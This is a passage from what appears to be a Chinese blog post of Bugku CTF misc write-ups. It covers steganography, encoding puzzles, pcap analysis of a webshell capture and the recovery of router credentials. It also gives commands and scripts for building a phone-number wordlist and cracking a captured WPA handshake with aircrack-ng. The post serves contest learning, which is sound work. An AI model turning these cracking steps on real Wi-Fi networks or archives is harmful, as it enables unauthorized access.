title="猜"></a>猜</h3><p>下载图片通过百度对图片搜索功能<br>key{liuyifei}</p><h3 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h3><p>题目中给出一个conf.bin文件，主要是工具，用routerpassview打开，然后找到</p><p>（ <username val="053700357621">    <password val="210265">）题目中给出了提示，flag是宽带用户名。</password></username></p><p>flag{053700357621}</p><h3 id="隐写2-Welcome-jpg"><a href="#隐写2-Welcome-jpg" class="headerlink" title="隐写2 Welcome_.jpg"></a>隐写2 Welcome_.jpg</h3><p>从网站上下载下来就是一张图片，同过binwalk分析其中包含一个zip压缩包。</p><p>通过binwalk进行提取，会提取出三个文件，其中flag.rar与提示.jpg是CD24.zip压缩包的内容。</p><p>通过提示.jpg可以得到压缩包密码3位数，通过ARCHRP软件进行暴力破解获得密码为871.</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281801_848.png" alt=""></p><p>解压获得3.jpg</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281803_237.png" alt=""></p><p>通过写字板打开获得f1@g{eTB1IEFyZSBhIGhAY2tlciE=} </p><p>很明显eTB1IEFyZSBhIGhAY2tlciE=是Base64加密，通过解密获得y0u Are a h@cker!</p><p>即f1@g{y0u Are a h@cker!}，提交时需要将f1@g变换为flag，即最终为flag{y0u Are a h@cker!}</p><h3 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h3><p>sublime打开<img src="http://oy0tigw51.bkt.clouddn.com/201804300041_863.png" alt=""></p><p>复制谷歌搜索得到一张二维码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300040_509.png" alt=""></p><p>可以将图片和base64互相转换的网站<br><a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="external">http://www.vgot.net/test/image2base64.php</a></p><p>最后得到二维码 扫描即可KEY{dca57f966e4e4e31fd5b15417da63269}</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>压缩包下载下来，解压，里面有一个flag文件，记事本打开，搜索flag没有，搜索key GET！</p><p>linux？ 不存在的…</p><pre><code>key{feb81d3834e2423c9903f4755464060b}</code></pre><p>方法二：</p><p>kali进行</p><p> tar -xvf 1.tar.gz </p><p>cat flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300111_333.png" alt=""></p><p>方法三：</p><p>放到linux里面strings打开，过滤一下KEY就找到了</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011620_101.png" alt=""></p><p>指令string flag | grep key</p><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>方法一：.pcapng又是数据包,wireshark打开，既然是用的菜刀，那就找http协议，第四个http包里找到了一句话木马： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300216_174.png" alt=""></p><p>flag应该在挂马之后才拿到，找到下一个http包，wireshark追踪一下http流： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300219_911.png" alt=""></p><p>可以知道菜刀创建了一个flag.tar.gz，还有echo了字符串<code>X@Y</code>，所以第三个包的response，出去前后两个字符串<code>X@Y</code>就是flag.tar.gz</p><p>然后把前后的“X@Y”删去，解码为压缩格式： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300215_384.png" alt=""></p><p>方法二：</p><p>用Wireshark打开分析 TCPstream</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300204_908.png" alt=""></p><p>在第九个数据包中看到了flag.tar.gz这个文件。</p><p>查看了一下其他数据包的内容，并没有关于传输这个文件的数据包信息。猜想这个文件可能被隐藏在caidao.pcapng里了。</p><p>放到binwalk分析，用dd命令把gzip文件提取出来。</p><blockquote><p>使用dd命令分离(linux/unix下)</p><p>dd命令分离出隐藏文件：</p><pre><code># dd if=carter.jpg of=output.jpg(自己定义的名字) skip=140147（对应的块偏移） bs=1</code></pre><p>-e选项可以用来执行自动数据提取的基础上提取规则中指定的默认的extract.conf文件：</p><pre><code>$ binwalk -e firmware.bin</code></pre></blockquote><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300156_242.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300157_912.png" alt=""></p><p>dd if=caidao.pcapng of=1.gzip skip=7747 bs=1</p><p>tar -xvf 1.gzip</p><p>cat flag/flag.txt </p><p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p><h3 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h3><p>根据提示要找getshell流，wireshark打开CTF.pcagng</p><p>先大致浏览一下，不难发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300237_928.png" alt="">追踪流——&gt;TCP可以看到其中有一个s4cr4t.txt的文件，base64解码得到flag</p><p>Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</p><blockquote><p>CCTF{do_you_like_sniffer}</p></blockquote><h3 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h3><p>当时的第一感觉就是大白怎么只有头没有身子，所以想到修改图片的宽和高。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300226_978.png" alt=""></p><p>更改02 A7</p><p>获得flag{He1l0_d4_ba1}</p><h3 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h3><p>这里用Java Decompiler 工具反编译。</p><p>分析以上代码可以得知，其中period是表示坚持的秒数，根据题目提示可以知道，需要坚持60秒，所以根据period/10找到case 6，得到flag的BASE64码flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}，解码得flag{DajiDali_JinwanChiji}。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300246_552.png" alt=""></p><h3 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h3><p>提示WIFI密码为手机号。下载下来是一个cap包，用wireshark打开。WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下——</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011539_973.png" alt=""></p><p>正好四个包，接下来就是破解密码了，因为已经给了11位手机号的前七位，使用crunch生成一个密码字典，然后进行破解</p><p> crunch 11 11 -t 1391040%%%% &gt;&gt;wifipassword.txt</p><p>学习crunch命令网站：<a href="http://netsecurity.51cto.com/art/201706/541638.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201706/541638.htm</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011546_958.png" alt=""></p><p>aircrack-ng wifi.cap -w wifipassword.txt</p><p>参数选择3 因为前两个为空</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011612_324.png" alt=""></p><p> KEY FOUND! [ 13910407686 ]</p><p>也可使用脚本写字典</p><pre><code class="c"># include&lt;stdio.h&gt;int main(){        int i,j,k,l;        FILE *fp=NULL;        fp=fopen(&quot;words.txt&quot;,&quot;w&quot;);        for(i=0;i&lt;=9;i++)    {                for(j=0;j&lt;=9;j++)        {                        for(k=0;k&lt;=9;k++)            {                                for(l=0;l&lt;=9;l++)                {                                        fprintf(fp,&quot;1391040%d%d%d%d\n&quot;,i,j,k,l);                                }                        }                }        }    fclose(fp);}</code></pre><pre><code class="python">s = &quot;1391040&quot;t = &quot;&quot;file = open(&#39;data.txt&#39;,&#39;w&#39;)for i in range(10):    for j in range(10):        for k in range(10):            for l in range(10):                t = s + str(i) + str(j) + str(k) + str(l)                file.write(t)                file.write(&#39;\n&#39;)file.close()</code></pre><h3 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h3><p>下载文件使用notepad++查看</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011716_149.png" alt=""></p><p>KEY{24f3627a86fc740a7f36ee2c7a1c124a}</p><p>方法二：strings brave | grep KEY</p><h3 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h3><p>把cookie修改为管理员,然后提示下载exe文件</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011722_15.png" alt=""></p><p>修改为true 得到下载地址，wireshark抓包随便填写账号密码抓包，筛选tcp流追踪一下</p><p>LOGIN下方是明显的BASE64编码，解码发现是一个163邮箱，取账+号密码，登陆后获取flag</p><p>flag{182100518+725593795416}</p><h3 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041929_134.png" alt=""></p><p>binwalk查看发现隐藏文件</p><p>foremost得到rar解压需要密码</p><p>右键查看照片属性</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041931_278.png" alt=""></p><p>base64解码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041933_188.png" alt=""></p><p>得到一个照片</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041935_321.png" alt=""></p><p>试一试修改高度</p><p>得到flag<img src="http://oy0tigw51.bkt.clouddn.com/201805041937_206.png" alt=""></p><p>BUGKU{a1e5aSA}</p><h3 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h3><p>binwalk分析隐藏压缩包，所以提取</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041939_484.png" alt="">得到zip文件</p><p>unzip 00000079.zip</p><p>得到8张文件和一个gif</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051138_920.png" alt=""></p><p>追一分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051140_411.png" alt=""></p><p>发现88、888、8888是被修改过的图片。</p><p>1.88图片自带二维码，扫描得到  bilibili</p><p>2.888将其后缀名添加上.jpg，查看其属性，从备注中获得一个使用base64加密的密文，解密得到silisili</p><p>3.8888有个压缩包，解压得到一张二维码得到panama</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051144_91.png" alt=""></p><p>最后根据题目提示的进行组合，得到 flag{bilibili_silisili_panama}</p><h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>图片的标题图穷flag见</p><p>以及题目图穷匕见都暗示该图片在文件末尾隐藏了信息，主题会画图吗的作用下文再分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805020025_829.png" alt=""></p><p>winhex打开，找到jpg的文件尾FF D9，发现其后还有大量的数据</p><p>复制保存到txt中尝试将数据按16进制-&gt;ASCII方式解码，思路就很明显了，使用的是notepad++中的插件Converter进行解码HEX-&gt;ASCII</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805042005_925.png" alt=""></p><p>这时候再结合会画图吗的提示，将这些坐标做成一张图即可，</p><p>用gnuplot这个工具比较方便，因此将坐标转为gnuplot能识别的格式 坐标1 坐标2</p><p>所以需要替换格式</p><p>替换</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061413_574.png" alt=""></p><p>kali安装gnuplot：sudo apt-get install gnuplot-x11 </p><p>plot “/root/Desktop/111.txt”  </p><p>但windows下是使用 plot “C:\\Users\\Asus\\Desktop\\111.txt”  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061427_357.png" alt=""></p><p>flag{40fc0a979f759c8892f4dc045e28b820}  </p><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><p>通过网址，可以看到一个convert.txt文件，文件内容为二进制</p><p>将所有的二进制串转化为十六进制串</p><p>十六进制串写入到一个rar的压缩包中,解压压缩包我们可以看到一个CTF图片: </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061458_280.png" alt=""></p><p>试一试右键属性发现base64编码的一段文字 解码。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061459_512.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061500_151.png" alt=""></p><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p><pre><code class="python">import binascii__author__ = &#39;Mang0&#39;# !/usr/bin/env python# -*- coding: utf-8 -*-base = [str(x) for x in range(10)] + [chr(x) for x in range(ord(&#39;A&#39;), ord(&#39;A&#39;) + 6)]# bin2decdef bin2dec(string_num):    return str(int(string_num, 2))# hex2decdef hex2dec(string_num):    return str(int(string_num.upper(), 16))# dec2bindef dec2bin(string_num):    num = int(string_num)    mid = []    while True:        if num == 0: break        num, rem = divmod(num, 2)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# dec2hexdef dec2hex(string_num):    num = int(string_num)    mid = []    while True:        if num == 0:            break        num, rem = divmod(num, 16)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# hex2tobindef hex2bin(string_num):    return dec2bin(hex2dec(string_num.upper()))# bin2hexdef bin2hex(string_num):    return dec2hex(bin2dec(string_num))if __name__ == &#39;__main__&#39;:    file1 = open(&#39;convert.txt&#39;)    s = file1.read()    hexx = bin2hex(s)    print (hexx)    file2 = open(&#39;4.rar&#39;, &#39;wb&#39;)    file2.write(binascii.a2b_hex(hexx))</code></pre><h3 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h3><p>通过网址，下载wav的音乐源文件：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061513_376.png" alt=""></p><p>通过Audacity软件打开音乐源文件，我们可以看到源文件中插入了一串东西：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061513_11.png" alt=""></p><p>放大观察，我们很容易想到是一串摩斯密码（短横杠代表<code>.</code>，长横杠代表<code>-</code>，中间代表空格）</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061514_267.png" alt=""></p><p>按照规律得到摩斯密码为：</p><pre><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></pre><p>解密后的字符串得到flag：<img src="http://oy0tigw51.bkt.clouddn.com/201805061518_97.png" alt=""></p><p>5BC925649CB0188F52E617D70929191C</p><h3 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h3><p> 打开记事本发现是一串0-255的数字，推测是RGB的数字表示形式。每组数据对应一个像素点，图片宽度推测503*122，撸个python脚本</p><pre><code>from PIL import Imageimport rex = 503 #x坐标  通过对txt里的行数进行整数分解y = 122 #y坐标  x*y = 行数im = Image.new(&quot;RGB&quot;,(x,y))#创建图片file = open(&#39;misc100.txt&#39;) #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x):    for j in range(0,y):        line = file.readline()#获取一行        rgb = line.split(&quot;,&quot;)#分离rgb        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.show()</code></pre><p>flag{youc@n’tseeme}</p><h3 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061547_404.jpg" alt=""></p><p>binwalk分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061546_905.png" alt=""></p><p>得到一个rar文件</p><p>解码密码不知道 右键图片属性也没有 爆破也没得到</p><p>后来网上查到密码就是“喜欢我吗.”尝试一下，将文本解压出来 </p><blockquote><p>嘟嘟嘟嘟<br>士兵：报告首长！已截获纳粹的加密电报！<br>首长：拿来看看</p><p>电报内容：<br>…./-/-/.–./—…/-..-./-..-././-./-.-./—/-.././.-.-.-/-.-./…./.-/…./..-/—/.-.-.-/-.-./—/–/-..-.</p><p>首长：我操你在逗我吗？你确定是他们纳粹发的吗？<br>士兵：难道我弄错了？哦。。。等等是这一条</p><p>内容：<a href="http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="external">http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a><br>      AES Key：@#@#￥%……￥￥%%……&amp;￥</p><p>士兵：二维码真的扫不出来吗？？肯定可以扫出来</p></blockquote><p>第一个电报密文很明显就是莫斯密码工具解密，得到一个网站：HTTP://ENCODE.CHAHUO.COM/ </p><p>AES加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061550_867.png" alt=""></p><p>momoj2j.png </p><p>那么真正网址就是<a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="external">http://c.bugku.com/momoj2j.png</a></p><p>访问后出现一个二维码，直接扫码，什么都扫不出来</p><p>反色得到flag</p><p>KEY{nitmzhen6}  </p><h3 id="很普通的数独-ISCCCTF"><a href="#很普通的数独-ISCCCTF" class="headerlink" title="很普通的数独(ISCCCTF)"></a>很普通的数独(ISCCCTF)</h3><p>下载zip，增加.zip得到25张数独的照片</p><p>确实没想到找了资料</p><p><a href="http://blog.chrstm.com/2017/05/29/ISCC2017/" target="_blank" rel="external">http://blog.chrstm.com/2017/05/29/ISCC2017/</a></p><p><a href="http://isron.cn/2017/05/24/ISCC-shudu/" target="_blank" rel="external">http://isron.cn/2017/05/24/ISCC-shudu/</a></p><p>base64编码的字符串：  Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9  经过7次解码之后就得到flag  <strong>flag：flag{y0ud1any1s1}</strong> </p><h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>发现一共解压出来68个zip压缩包。当我们尝试打开压缩包时，提示我们输入密码 </p><p>crc32碰撞，暴力破解得到base64 ，解码十六进制</p><ul><li>cf907300000d00000000000000aa3e7a008023004900000054000000028634abfe6b631d491d33030001000000434d54091514cbdd414f952448d3e88f984511514146f79f1d20427c6d2bb869ca9f282c3328fc4816991f1b181d8f382c4676e1c5ed674d72de4d4ad58274be92bd1f0a94cdbeaef73f22804af77420902d001d0000001d0000000262d1e7d54f631d491d30080020000000666c61672e74787400b0346966666978207468652066696c6520616e64206765742074686520666c6167c43d7b00400700a</li></ul><p>之后补上文件头后解压</p><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://blog.csdn.net/xuqi7/article/details/71436020" target="_blank" rel="external">CTF—图片相关</a></p><p><a href="https://my.oschina.net/ososchina/blog/801358" target="_blank" rel="external">PNG图片文件结构分析</a></p><p><a href="https://www.anquanke.com/post/id/86211" target="_blank" rel="external">CTF比赛中关于zip的总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;bugku-misc&quot;&gt;&lt;a href=&quot;#bugku-misc&quot; class=&quot;headerlink&quot; title=&quot;bugku misc&quot;&gt;&lt;/a&gt;bugku misc&lt;/h1&gt;&lt;p&gt;做了iscc2018发现自己misc能力差很多，也忘了很多，这周做了bugk
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://mang0.me/tags/WP/"/>
    
  </entry>
  
</feed>
